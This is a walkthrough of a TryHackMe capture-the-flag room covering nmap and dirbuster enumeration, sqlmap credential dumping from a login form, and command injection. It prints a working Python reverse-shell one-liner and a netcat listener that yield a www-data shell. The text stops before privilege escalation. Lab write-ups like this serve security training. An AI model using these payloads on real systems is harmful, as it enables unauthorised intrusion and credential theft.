---
title: The Cod Caper | TryHackMe
author:
  name: iamiqbal
  link: https://twitter.com/mib47225
date: 2022-08-04 11:00:00
categories: [THM, BinaryExploitation]
tags: [pwn, pwntools, Reversing, security]
---

Hey there! This is my first writeup in which I'll be walking you through infiltrating and exploiting a Linux system. This writeup will be a bit longer as it covers binary exploitation as well.

## Task 1: **Intro**

___

> Note: This room expects some basic pen testing knowledge, as I will not be going over every tool in detail that is used. While you can just use the room to follow through, some interest or experiencing in assembly is highly recommended

## Task 2: **Host Enumeration**
___

I'll use **nmap** for scanning the host for open ports and services running on these ports.

```bash
nmap -sC -sV [Target IP]

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-04 15:22 EDT
Nmap scan report for <IP>
Host is up (0.52s latency).
Not shown: <N> closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
<Redacted>
```

## Task 3: **Web Enumeration**
___
Now that we know what ports are open, we can further enumerate and use **dirbuster** for directory busting. We are already provided the wordlist big.txt

```bash
dibuster&
```
![dirbuster](/assets/img/THM/The_Cod_Caper/1.png)

dirbuster has returned the name of the important file on the server.

## Task 4: **Web Exploitation**
___
Once we visit the page that we got through directory busting, we see that it is a login form.

![login form](/assets/img/THM/The_Cod_Caper/2.png)

We can use burpsuite but we are not provided any wordlist for doing a bruteforce attack. Instead we can check for possible sql injection which will output the username and password for us to login.

```bash
sqlmap -u http://[IP]/[Login Page] --forms --dump
```
Let sqlmap do its job. Once it is done you can answer questions of this task.

## Task 5: **Command Execution**
___
When we login, we are presented with a text box. In this text box we can enter commands and it'll execute it for us and show us the output.

For example running ```whoami``` gives us the following output:
![whoami](/assets/img/THM/The_Cod_Caper/3.png)

If we can run ```whoami```, we can get a reverse shell as well. SMART Right! Let's do this.

Copy the following python code and paste it in the text box. REMEMBER to change the IP to your IP address.

```python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'```

Also listen for incoming connections through netcat before executing the command pasted inside text box.

```bash
nc -lvnp 4242
```

This should give you a reverse shell

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5555             
listening on [any] 5555 ...
connect to [10.0.0.1] from (UNKNOWN) [10.10.154.134] 34572
$ whoami
whoami
www-data
$ 
```

We got a reverse shell, What's next? Well... We have to switch to **pingu's** account but how? 